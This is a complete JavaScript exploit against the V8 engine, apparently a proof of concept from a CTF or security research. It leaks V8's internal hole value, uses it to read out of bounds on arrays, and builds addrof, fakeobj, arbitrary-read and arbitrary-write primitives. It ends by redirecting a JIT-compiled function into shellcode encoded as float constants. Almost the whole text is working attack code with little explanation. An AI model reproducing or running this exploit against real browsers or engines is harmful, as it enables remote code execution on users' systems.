function gc_minor() {
  for (let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}

function gc_major() {
  new ArrayBuffer(0x7fe00000);
}

var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i(f) {
  float64[0] = f;
  return bigUint64[0];
}

function i2f(i) {
  bigUint64[0] = i;
  return float64[0];
}

Number.prototype.toBigInt = function toBigInt() {
  float64[0] = this;
  return bigUint64[0];
};

BigInt.prototype.toNumber = function toNumber() {
  bigUint64[0] = this;
  return float64[0];
};

function hex(i) {
  return i.toString(16).padStart(16, "0");
}

// =================== //
//     Start here!     //
// =================== //

function load_stack() {
  let a = stack;
  return a;
}

Error.captureStackTrace(globalThis);
Error.prepareStackTrace = () => {
  delete stack;
  Object.defineProperty(globalThis, 'stack', { value: 1, writable: true }); // configurable: false
  stack = {}; // cell_type == kMutable

  for (let i = 0; i < 0x10000; i++) { load_stack(); }
}

Object.defineProperty(globalThis, 'stack', { value: 1, configurable: true });
delete stack;
let hole = load_stack(); // the_hole

// console.log(hole);


// must be const
const the = {
  hole: hole
};

let f_arr;
let o_arr;

let floatMap;
let floatProperty;

function oob(bool) {
  let hole = the.hole;
  let idx = (Number(bool ? hole : -1) | 0) + 1;

  f_arr = [1.1];
  let compressedPointer = f2i(f_arr.at(idx * 1));
  floatMap = compressedPointer & 0xffffffffn;
  floatProperty = compressedPointer >> 32n;
}

for (var i = 0; i < 0x10000; i++) {
  oob(true);
}
//  % PrepareFunctionForOptimization(oob);
//  oob(true);
//  % OptimizeFunctionOnNextCall(oob);
//  oob(true);
//  console.log(oob(true));


// primitive addrof
function addrof(bool, obj) {
  let hole = the.hole;
  let idx = (Number(bool ? hole : -1) | 0) + 1; // 1 or 0
  f_arr = [1.1];
  o_arr = [obj];
  //     return f2i(f_arr.at(idx * 4)) & 0xffffffffn;
  return f2i(f_arr.at(idx * 4)) & 0xffffffffn;
}

for (var i = 0; i < 0x10000; i++) {
  addrof(true, {});
}

//  % PrepareFunctionForOptimization(addrof);
//  addrof(true,{});
//  % OptimizeFunctionOnNextCall(addrof);
//  addrof(true,{});

// primitive fakeobj
function fakeobj(bool, addr) {
  let hole = the.hole;
  let idx = (Number(bool ? hole : -1) | 0) + 1;
  addr = i2f(addr);

  o_arr = [{}];
  f_arr = [addr];

  let fake_obj = o_arr.at(idx * 7);
  return fake_obj;
}

for (var i = 0; i < 0x10000; i++) {
  fakeobj(true, f2i(1.1));
}

//  % PrepareFunctionForOptimization(fakeobj);
//  fakeobj(true, f2i(1.1));
//  % OptimizeFunctionOnNextCall(fakeobj);
//  fakeobj(true, f2i(1.1));

// primitive arbitrary address read
function aar(addr) {
  let fake_obj_header = [1.1, 2.2];
  fake_obj_header[0] = i2f((floatProperty << 32n) | floatMap);
  fake_obj_header[1] = i2f((2n << 32n) | (addr - 8n));
  let dbl_arr_struct_addr = addrof(true, fake_obj_header);
  let fake_dbl_arr = fakeobj(true, dbl_arr_struct_addr - 0x10n);
  return fake_dbl_arr[0];
}

function aaw(addr, value) {
  let fake_obj_header = [1.1, 2.2];
  fake_obj_header[0] = i2f((floatProperty << 32n) | floatMap);
  fake_obj_header[1] = i2f((2n << 32n) | (addr - 8n));
  let dbl_arr_struct_addr = addrof(true, fake_obj_header);

  let fake_dbl_arr = fakeobj(true, dbl_arr_struct_addr - 0x10n);
  fake_dbl_arr[0] = i2f(value);
}


gc_major();
const shellcode = () => {
  return [1.95538254221075331056310651818E-246,
    1.95606125582421466942709801013E-246,
    1.99957147195425773436923756715E-246,
    1.95337673326740932133292175341E-246,
    2.63486047652296056448306022844E-284];
}

for (var i = 0; i < 0x10000; i++) {
  shellcode();
}
//% PrepareFunctionForOptimization(shellcode);
//shellcode();
//% OptimizeFunctionOnNextCall(shellcode);
//shellcode();

//%DebugPrint(shellcode);
let shellcode_addr = addrof(true, shellcode);
let code_addr = f2i(aar(shellcode_addr + 0x18n)) & 0xffffffffn;
let real_inst = f2i(aar(code_addr + 0x10n)) + 0x56n;
aaw(code_addr + 0x10n, real_inst);
//%SystemBreak();
shellcode();

